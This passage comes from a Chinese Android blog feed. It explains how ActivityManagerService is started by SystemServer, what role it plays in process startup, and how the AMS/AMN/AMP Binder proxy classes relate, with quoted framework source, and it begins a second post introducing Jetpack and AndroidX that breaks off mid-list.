class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">       new SystemServer().run();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>main方法中只调用了SystemServer的run方法，如下所示。<br><strong>frameworks/base/services/java/com/android/server/SystemServer.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private void run() &#123;</span><br><span class="line">       ...</span><br><span class="line">           System.loadLibrary(&quot;android_servers&quot;);&#x2F;&#x2F;1</span><br><span class="line">       ...</span><br><span class="line">           mSystemServiceManager &#x3D; new SystemServiceManager(mSystemContext);&#x2F;&#x2F;2</span><br><span class="line">           LocalServices.addService(SystemServiceManager.class, mSystemServiceManager);</span><br><span class="line">       ...    </span><br><span class="line">        try &#123;</span><br><span class="line">           Trace.traceBegin(Trace.TRACE_TAG_SYSTEM_SERVER, &quot;StartServices&quot;);</span><br><span class="line">           startBootstrapServices();&#x2F;&#x2F;3</span><br><span class="line">           startCoreServices();&#x2F;&#x2F;4</span><br><span class="line">           startOtherServices();&#x2F;&#x2F;5</span><br><span class="line">       &#125; catch (Throwable ex) &#123;</span><br><span class="line">           Slog.e(&quot;System&quot;, &quot;******************************************&quot;);</span><br><span class="line">           Slog.e(&quot;System&quot;, &quot;************ Failure starting system services&quot;, ex);</span><br><span class="line">           throw ex;</span><br><span class="line">       &#125; finally &#123;</span><br><span class="line">           Trace.traceEnd(Trace.TRACE_TAG_SYSTEM_SERVER);</span><br><span class="line">       &#125;</span><br><span class="line">       ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在注释1处加载了动态库libandroid_servers.so。接下来在注释2处创建SystemServiceManager，它会对系统的服务进行创建、启动和生命周期管理。在注释3中的startBootstrapServices方法中用SystemServiceManager启动了ActivityManagerService、PowerManagerService、PackageManagerService等服务。在注释4处的startCoreServices方法中则启动了BatteryService、UsageStatsService和WebViewUpdateService。注释5处的startOtherServices方法中启动了CameraService、AlarmManagerService、VrManagerService等服务。这些服务的父类均为SystemService。从注释3、4、5的方法可以看出，官方把系统服务分为了三种类型，分别是引导服务、核心服务和其他服务，其中其他服务是一些非紧要和一些不需要立即启动的服务。系统服务总共大约有80多个，我们主要来查看引导服务AMS是如何启动的，注释3处的startBootstrapServices方法如下所示。</p><p><strong>frameworks/base/services/java/com/android/server/SystemServer.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private void startBootstrapServices() &#123;</span><br><span class="line">     Installer installer &#x3D; mSystemServiceManager.startService(Installer.class);</span><br><span class="line">     &#x2F;&#x2F; Activity manager runs the show.</span><br><span class="line">     mActivityManagerService &#x3D; mSystemServiceManager.startService(</span><br><span class="line">             ActivityManagerService.Lifecycle.class).getService();&#x2F;&#x2F;1</span><br><span class="line">     mActivityManagerService.setSystemServiceManager(mSystemServiceManager);</span><br><span class="line">     mActivityManagerService.setInstaller(installer);</span><br><span class="line">   ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在注释1处调用了SystemServiceManager的startService方法，方法的参数是ActivityManagerService.Lifecycle.class：<br><strong>frameworks/base/services/core/java/com/android/server/SystemServiceManager.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">  public &lt;T extends SystemService&gt; T startService(Class&lt;T&gt; serviceClass) &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">         ...</span><br><span class="line">          final T service;</span><br><span class="line">          try &#123;</span><br><span class="line">              Constructor&lt;T&gt; constructor &#x3D; serviceClass.getConstructor(Context.class);&#x2F;&#x2F;1</span><br><span class="line">              service &#x3D; constructor.newInstance(mContext);&#x2F;&#x2F;2</span><br><span class="line">          &#125; catch (InstantiationException ex) &#123;</span><br><span class="line">            ...</span><br><span class="line">          &#125;</span><br><span class="line">          &#x2F;&#x2F; Register it.</span><br><span class="line">          mServices.add(service);&#x2F;&#x2F;3</span><br><span class="line">          &#x2F;&#x2F; Start it.</span><br><span class="line">          try &#123;</span><br><span class="line">              service.onStart();&#x2F;&#x2F;4</span><br><span class="line">          &#125; catch (RuntimeException ex) &#123;</span><br><span class="line">              throw new RuntimeException(&quot;Failed to start service &quot; + name</span><br><span class="line">                      + &quot;: onStart threw an exception&quot;, ex);</span><br><span class="line">          &#125;</span><br><span class="line">          return service;</span><br><span class="line">      &#125; finally &#123;</span><br><span class="line">          Trace.traceEnd(Trace.TRACE_TAG_SYSTEM_SERVER);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>startService方法传入的参数是Lifecycle.class，Lifecycle继承自SystemService。首先，通过反射来创建Lifecycle实例，注释1处得到传进来的Lifecycle的构造器constructor，在注释2处调用constructor的newInstance方法来创建Lifecycle类型的service对象。接着在注释3处将刚创建的service添加到ArrayList类型的mServices对象中来完成注册。最后在注释4处调用service的onStart方法来启动service，并返回该service。Lifecycle是AMS的内部类，代码如下所示。<br><strong>frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static final class Lifecycle extends SystemService &#123;</span><br><span class="line">     private final ActivityManagerService mService;</span><br><span class="line">     public Lifecycle(Context context) &#123;</span><br><span class="line">         super(context);</span><br><span class="line">         mService &#x3D; new ActivityManagerService(context);&#x2F;&#x2F;1</span><br><span class="line">     &#125;</span><br><span class="line">     @Override</span><br><span class="line">     public void onStart() &#123;</span><br><span class="line">         mService.start();&#x2F;&#x2F;2</span><br><span class="line">     &#125;</span><br><span class="line">     public ActivityManagerService getService() &#123;</span><br><span class="line">         return mService;&#x2F;&#x2F;3</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>上面的代码结合SystemServiceManager的startService方法来分析，当通过反射来创建Lifecycle实例时，会调用注释1处的方法创建AMS实例，当调用Lifecycle类型的service的onStart方法时，实际上是调用了注释2处AMS的start方法。在SystemServer的startBootstrapServices方法的注释1处，调用了如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mActivityManagerService &#x3D; mSystemServiceManager.startService(</span><br><span class="line">               ActivityManagerService.Lifecycle.class).getService();</span><br></pre></td></tr></table></figure><p>我们知道SystemServiceManager的startService方法最终会返回Lifecycle类型的对象，紧接着又调用了Lifecycle的getService方法，这个方法会返回AMS类型的mService对象，见注释3处，这样AMS实例就会被创建并且返回。</p><h1 id="3-AMS与进程启动"><a href="#3-AMS与进程启动" class="headerlink" title="3.AMS与进程启动"></a>3.AMS与进程启动</h1><p>在<a href="http://liuwangshu.cn/framework/booting/2-zygote.html">Android系统启动流程（二）解析Zygote进程启动过程</a>这篇文章中，我提到了Zygote的Java框架层中，会创建一个Server端的Socket，这个Socket用来等待AMS来请求Zygote来创建新的应用程序进程。要启动一个应用程序，首先要保证这个应用程序所需要的应用程序进程已经被启动。AMS在启动应用程序时会检查这个应用程序需要的应用程序进程是否存在，不存在就会请求Zygote进程将需要的应用程序进程启动。Service的启动过程中会调用ActiveServices的bringUpServiceLocked方法，如下所示。<br><strong>frameworks/base/services/core/java/com/android/server/am/ActiveServices.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  private String bringUpServiceLocked(ServiceRecord r, int intentFlags, boolean execInFg,</span><br><span class="line">            boolean whileRestarting, boolean permissionsReviewRequired)</span><br><span class="line">            throws TransactionTooLargeException &#123;</span><br><span class="line">  ...</span><br><span class="line">  final String procName &#x3D; r.processName;&#x2F;&#x2F;1</span><br><span class="line">  ProcessRecord app;</span><br><span class="line">  if (!isolated) &#123;</span><br><span class="line">            app &#x3D; mAm.getProcessRecordLocked(procName, r.appInfo.uid, false);&#x2F;&#x2F;2</span><br><span class="line">            if (DEBUG_MU) Slog.v(TAG_MU, &quot;bringUpServiceLocked: appInfo.uid&#x3D;&quot; + r.appInfo.uid</span><br><span class="line">                        + &quot; app&#x3D;&quot; + app);</span><br><span class="line">            if (app !&#x3D; null &amp;&amp; app.thread !&#x3D; null) &#123;&#x2F;&#x2F;3</span><br><span class="line">                try &#123;</span><br><span class="line">                    app.addPackage(r.appInfo.packageName, r.appInfo.versionCode,</span><br><span class="line">                    mAm.mProcessStats);</span><br><span class="line">                    realStartServiceLocked(r, app, execInFg);&#x2F;&#x2F;4</span><br><span class="line">                    return null;</span><br><span class="line">                &#125; catch (TransactionTooLargeException e) &#123;</span><br><span class="line">                   ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                app &#x3D; r.isolatedProc;</span><br><span class="line">            &#125;</span><br><span class="line">       if (app &#x3D;&#x3D; null &amp;&amp; !permissionsReviewRequired) &#123;&#x2F;&#x2F;5</span><br><span class="line">            if ((app&#x3D;mAm.startProcessLocked(procName, r.appInfo, true, intentFlags,</span><br><span class="line">                    &quot;service&quot;, r.name, false, isolated, false)) &#x3D;&#x3D; null) &#123;&#x2F;&#x2F;6</span><br><span class="line">              ...</span><br><span class="line">            &#125;</span><br><span class="line">            if (isolated) &#123;</span><br><span class="line">                r.isolatedProc &#x3D; app;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> ...     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在注释1处得到ServiceRecord的processName的值赋值给procName ，其中ServiceRecord用来描述Service的android:process属性。注释2处将procName和Service的uid传入到AMS的getProcessRecordLocked方法中，来查询是否存在一个与Service对应的ProcessRecord类型的对象app，ProcessRecord主要用来记录运行的应用程序进程的信息。注释5处判断Service对应的app为null则说明用来运行Service的应用程序进程不存在，则调用注释6处的AMS的startProcessLocked方法来创建对应的应用程序进程，<br>具体的过程请查看<a href="http://liuwangshu.cn/framework/applicationprocess/1.html">Android应用程序进程启动过程（前篇）</a>。</p><h1 id="4-AMS家族"><a href="#4-AMS家族" class="headerlink" title="4.AMS家族"></a>4.AMS家族</h1><p>ActivityManager是一个和AMS相关联的类，它主要对运行中的Activity进行管理，这些管理工作并不是由ActivityManager来处理的，而是交由AMS来处理，ActivityManager中的方法会通过ActivityManagerNative（以后简称AMN）的getDefault方法来得到ActivityManagerProxy(以后简称AMP)，通过AMP就可以和AMN进行通信，而AMN是一个抽象类，它会将功能交由它的子类AMS来处理，因此，AMP就是AMS的代理类。AMS作为系统核心服务，很多API是不会暴露给ActivityManager的，因此ActivityManager并不算是AMS家族一份子。<br>为了讲解AMS家族，这里拿Activity的启动过程举例，Activity的启动过程中会调用Instrumentation的execStartActivity方法，如下所示。<br><strong>frameworks/base/core/java/android/app/Instrumentation.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public ActivityResult execStartActivity(</span><br><span class="line">            Context who, IBinder contextThread, IBinder token, Activity target,</span><br><span class="line">            Intent intent, int requestCode, Bundle options) &#123;</span><br><span class="line">      ...</span><br><span class="line">        try &#123;</span><br><span class="line">            intent.migrateExtraStreamToClipData();</span><br><span class="line">            intent.prepareToLeaveProcess(who);</span><br><span class="line">            int result &#x3D; ActivityManagerNative.getDefault()</span><br><span class="line">                .startActivity(whoThread, who.getBasePackageName(), intent,</span><br><span class="line">                        intent.resolveTypeIfNeeded(who.getContentResolver()),</span><br><span class="line">                        token, target !&#x3D; null ? target.mEmbeddedID : null,</span><br><span class="line">                        requestCode, 0, null, options);</span><br><span class="line">            checkStartActivityResult(result, intent);</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            throw new RuntimeException(&quot;Failure from system&quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>execStartActivity方法中会调用AMN的getDefault来获取AMS的代理类AMP。接着调用了AMP的startActivity方法，先来查看AMN的getDefault方法做了什么，如下所示。<br><strong>frameworks/base/core/java/android/app/ActivityManagerNative.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> static public IActivityManager getDefault() &#123;</span><br><span class="line">        return gDefault.get();</span><br><span class="line">    &#125;</span><br><span class="line">    private static final Singleton&lt;IActivityManager&gt; gDefault &#x3D; new Singleton&lt;IActivityManager&gt;() &#123;</span><br><span class="line">        protected IActivityManager create() &#123;</span><br><span class="line">            IBinder b &#x3D; ServiceManager.getService(&quot;activity&quot;);&#x2F;&#x2F;1</span><br><span class="line">            if (false) &#123;</span><br><span class="line">                Log.v(&quot;ActivityManager&quot;, &quot;default service binder &#x3D; &quot; + b);</span><br><span class="line">            &#125;</span><br><span class="line">            IActivityManager am &#x3D; asInterface(b);&#x2F;&#x2F;2</span><br><span class="line">            if (false) &#123;</span><br><span class="line">                Log.v(&quot;ActivityManager&quot;, &quot;default service &#x3D; &quot; + am);</span><br><span class="line">            &#125;</span><br><span class="line">            return am;</span><br><span class="line">        &#125;+</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getDefault方法调用了gDefault的get方法，我们接着往下看，gDefault 是一个Singleton类。注释1处得到名为”activity”的Service引用，也就是IBinder类型的AMS的引用。接着在注释2处将它封装成AMP类型对象，并将它保存到gDefault中，此后调用AMN的getDefault方法就会直接获得AMS的代理对象AMP。注释2处的asInterface方法如下所示。<br><strong>frameworks/base/core/java/android/app/ActivityManagerNative.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">static public IActivityManager asInterface(IBinder obj) &#123;</span><br><span class="line">    if (obj &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    IActivityManager in &#x3D;</span><br><span class="line">        (IActivityManager)obj.queryLocalInterface(descriptor);</span><br><span class="line">    if (in !&#x3D; null) &#123;</span><br><span class="line">        return in;</span><br><span class="line">    &#125;</span><br><span class="line">    return new ActivityManagerProxy(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>asInterface方法的主要作用就是将IBinder类型的AMS引用封装成AMP，AMP的构造方法如下所示。</p><p><strong>frameworks/base/core/java/android/app/ActivityManagerNative.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class ActivityManagerProxy implements IActivityManager</span><br><span class="line">&#123;</span><br><span class="line">    public ActivityManagerProxy(IBinder remote)</span><br><span class="line">    &#123;</span><br><span class="line">        mRemote &#x3D; remote;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>AMP的构造方法中将AMS的引用赋值给变量mRemote ，这样在AMP中就可以使用AMS了。<br>其中IActivityManager是一个接口，AMN和AMP都实现了这个接口，用于实现代理模式和Binder通信。<br>再回到Instrumentation的execStartActivity方法，来查看AMP的startActivity方法，AMP是AMN的内部类，代码如下所示。<br><strong>frameworks/base/core/java/android/app/ActivityManagerNative.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public int startActivity(IApplicationThread caller, String callingPackage, Intent intent,</span><br><span class="line">           String resolvedType, IBinder resultTo, String resultWho, int requestCode,</span><br><span class="line">           int startFlags, ProfilerInfo profilerInfo, Bundle options) throws RemoteException &#123;</span><br><span class="line">     ...</span><br><span class="line">       data.writeInt(requestCode);</span><br><span class="line">       data.writeInt(startFlags);</span><br><span class="line">     ...</span><br><span class="line">       mRemote.transact(START_ACTIVITY_TRANSACTION, data, reply, 0);&#x2F;&#x2F;1</span><br><span class="line">       reply.readException();+</span><br><span class="line">       int result &#x3D; reply.readInt();</span><br><span class="line">       reply.recycle();</span><br><span class="line">       data.recycle();</span><br><span class="line">       return result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>首先会将传入的参数写入到Parcel类型的data中。在注释1处，通过IBinder类型对象mRemote（AMS的引用）向服务端的AMS发送一个START_ACTIVITY_TRANSACTION类型的进程间通信请求。那么服务端AMS就会从Binder线程池中读取我们客户端发来的数据，最终会调用AMN的onTransact方法，如下所示。<br><strong>frameworks/base/core/java/android/app/ActivityManagerNative.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public boolean onTransact(int code, Parcel data, Parcel reply, int flags)</span><br><span class="line">        throws RemoteException &#123;</span><br><span class="line">    switch (code) &#123;</span><br><span class="line">    case START_ACTIVITY_TRANSACTION:</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">        int result &#x3D; startActivity(app, callingPackage, intent, resolvedType,</span><br><span class="line">                resultTo, resultWho, requestCode, startFlags, profilerInfo, options);</span><br><span class="line">        reply.writeNoException();</span><br><span class="line">        reply.writeInt(result);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>onTransact中会调用AMS的startActivity方法，如下所示。<br><strong>frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public final int startActivity(IApplicationThread caller, String callingPackage,</span><br><span class="line">        Intent intent, String resolvedType, IBinder resultTo, String resultWho, int requestCode,</span><br><span class="line">        int startFlags, ProfilerInfo profilerInfo, Bundle bOptions) &#123;</span><br><span class="line">    return startActivityAsUser(caller, callingPackage, intent, resolvedType, resultTo,</span><br><span class="line">            resultWho, requestCode, startFlags, profilerInfo, bOptions,</span><br><span class="line">            UserHandle.getCallingUserId());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>startActivity方法会最后return startActivityAsUser方法，如下所示。<br><strong>frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public final int startActivityAsUser(IApplicationThread caller, String callingPackage,</span><br><span class="line">        Intent intent, String resolvedType, IBinder resultTo, String resultWho, int requestCode,</span><br><span class="line">        int startFlags, ProfilerInfo profilerInfo, Bundle bOptions, int userId) &#123;</span><br><span class="line">    enforceNotIsolatedCaller(&quot;startActivity&quot;);</span><br><span class="line">    userId &#x3D; mUserController.handleIncomingUser(Binder.getCallingPid(), Binder.getCallingUid(),</span><br><span class="line">            userId, false, ALLOW_FULL_ONLY, &quot;startActivity&quot;, null);</span><br><span class="line">    return mActivityStarter.startActivityMayWait(caller, -1, callingPackage, intent,</span><br><span class="line">            resolvedType, null, null, resultTo, resultWho, requestCode, startFlags,</span><br><span class="line">            profilerInfo, null, null, bOptions, false, userId, null, null);</span><br><span class="line"> &#125;           </span><br></pre></td></tr></table></figure><p>startActivityAsUser方法最后会return ActivityStarter的startActivityMayWait方法，这一调用过程已经脱离了本节要讲的AMS家族，因此这里不做介绍了，具体的调用过程可以查看<a href="http://liuwangshu.cn/framework/component/1-activity-start-2.html">Android深入四大组件（一）应用程序启动过程（后篇）</a>这篇文章。</p><p>在Activity的启动过程中提到了AMP、AMN和AMS，它们共同组成了AMS家族的主要部分，如下图所示。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-34efe6a00ae6887f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>AMP是AMN的内部类，它们都实现了IActivityManager接口，这样它们就可以实现代理模式，具体来讲是远程代理：AMP和AMN是运行在两个进程的，AMP是Client端，AMN则是Server端，而Server端中具体的功能都是由AMN的子类AMS来实现的，因此，AMP就是AMS在Client端的代理类。AMN又实现了Binder类，这样AMP可以和AMS就可以通过Binder来进行进程间通信。</p><p>ActivityManager通过AMN的getDefault方法得到AMP，通过AMP就可以和AMN进行通信，也就是间接的与AMS进行通信。除了ActivityManager，其他想要与AMS进行通信的类都需要通过AMP，如下图所示。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-b03b714636aa8fa8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://blog.csdn.net/innost/article/details/47254381">[深入理解Android卷二 全文-第六章]深入理解ActivityManagerService</a><br><a href="http://www.jianshu.com/p/194a37755fea">Framework源码分析（一）：ActivityManagerService</a><br><a href="http://www.cnblogs.com/bastard/archive/2012/05/25/2517522.html">ActivityManager与Proxy模式的运用</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Jetpack简介</title>
      <link href="/2021/09/11/Android-Jetpack%E7%AE%80%E4%BB%8B/"/>
      <url>/2021/09/11/Android-Jetpack%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>[转]<br><a href="https://juejin.cn/post/6844904000429506567">还不知道Android Jetpack是什么？你就out了</a><br><a href="https://blog.csdn.net/vitaviva/article/details/104139034">Jetpack与AndroidX的关系</a></p><p>#简介<br>谷歌在 2018 I/O 大会上发布了一系列辅助android开发者的实用工具，这套工具就是Jetpack，它是一套库、工具和指南的合集，可以帮助开发者更轻松地编写和构建出色的 Android 应用程序。<br>Jetpack中的有些组件并不是第一次推出，其中LifeCycle、LiveData、ViewModel、Room等组件早在 Google I/O 2017年大会上就随着 Android Architecture Component（AAC）一起推出了，但是推广效果一般。时隔一年后谷歌在AAC的基础之上发布了Jetpack，并发布了其他工具以解决Android技术选型乱以及开发不规范等问题。<br>Jetpack有以下特点：</p><ul><li><p>加速开发：组件可以单独采用（不过这些组件是为协同工作而构建的），同时利用 Kotlin 语言功能帮助您提高工作效率。</p></li><li><p>消除样板代码：Jetpack 可管理繁琐的 Activity（如后台任务、导航和生命周期管理）。</p></li><li><p>构建高质量的强大应用：Jetpack 组件围绕现代化设计实践构建而成，具有向后兼容性，可以减少崩溃和内存泄漏。</p></li></ul><h1 id="Jetpack与AndroidX的关系"><a href="#Jetpack与AndroidX的关系" class="headerlink" title="Jetpack与AndroidX的关系"></a>Jetpack与AndroidX的关系</h1><p>Jetpack与AndroidX同样作为Android官方大力推广的新技术，两者之间是什么关系呢</p><p><strong>AndroidX</strong><br>Google在Google I/O 2018上首次发布了AndroidX，AndroidX和Support一样都是独立于AndroidSDK版本存在的类库，Support虽然独立于SDK，但是其版本号与SDK高度耦合，且所有的Support库的版本必须保持一致，无法单独升级。随着Support子库种类越来越多，这种强一致的版本管理方式越来越不灵活，于是Andoird推出了 AndroidX，其目的是用全新的的包名和版本的组织方式替代Support，自support v7:28之后便不再更新，新的功能开发转到AndroidX进行，当然官方也贴心地提供了工具，方便开发者将项目顺利迁移到AndroidX。通过下表，我们可以了解AndroidX与Support的对照关系：</p><p><a href="https://developer.android.com/jetpack/androidx/migrate/artifact-mappings">https://developer.android.com/jetpack/androidx/migrate/artifact-mappings</a></p><p><strong>Jetpack</strong><br>Android曾经以Android Architecture Components的名称在Support中发布了一系列工具包，例如LiveData、ViewModel等，旨在指导开发者构建出架构合理的Android 应用，这些工具包也成为Support库中的一部分。Google在2018年 I/O上以Android Architecture Components为基础，同时纳入了一些其他组件和工具后，统一以Jetpack的品牌进行了发布。时至今日Jetpack基本上涵盖了除了AndroidSDK以外的所有功能 <a href="https://developer.android.com/jetpack%E3%80%82">https://developer.android.com/jetpack。</a></p><p><strong>结论</strong><br>综上，Jetpack和AndroidX基本上可以等同理解，都是对Android标准Sdk以外的功能合集的描述。Jetpack作为对外宣传用的品牌存在，而AndroidX是真正的代码包名。</p><h4 id="Jetpack分类"><a href="#Jetpack分类" class="headerlink" title="Jetpack分类"></a>Jetpack分类</h4><p>Android Jetpack组件共分为四大类，Foundation、Architecture、Behavior和UI。</p><p><strong>Foundation(基础组件)：</strong><br>基础组件提供了横向功能，例如向后兼容性、测试以及Kotlin语言的支持。它包含如下组件库：</p><ul><li>Android KTX：Android KTX 是一组 Kotlin 扩展程序，它优化了供Kotlin使用的Jetpack和Android平台的API。以更简洁、更愉悦、更惯用的方式使用Kotlin进行Android开发。</li><li>AppCompat：提供了一系列以AppCompat开头的API，以便兼容低版本的Android开发。</li><li>Cars(Auto)：有助于开发 Android Auto 应用的组件，无需担心特定于车辆的硬件差异（如屏幕分辨率、软件界面、旋钮和触摸式控件）。</li><li>Benchmark(检测)：从 Android Studio 中快速对基于 Kotlin 或 Java 的代码进行基准化分析。衡量代码性能，并将基准化分析结果输出到 Android Studio 控制台。</li><li>Multidex(多Dex处理)：为方法数超过 64K 的应用启用多 dex 文件。</li><li>Security(安全)：按照安全最佳做法读写加密文件和共享偏好设置。</li><li>Test(测试)：用于单元和运行时界面测试的 Android 测试框架。</li><li>TV：构建可让用户在大屏幕上体验沉浸式内容的应用。</li><li>Wear OS：有助于开发 Wear 应用的组件。</li></ul><p><strong>Architecture(架构组件)：</strong><br>架构组件可帮助开发者设计稳健、可测试且易维护的应用。它包含如下组件库：</p><ul><li>Data 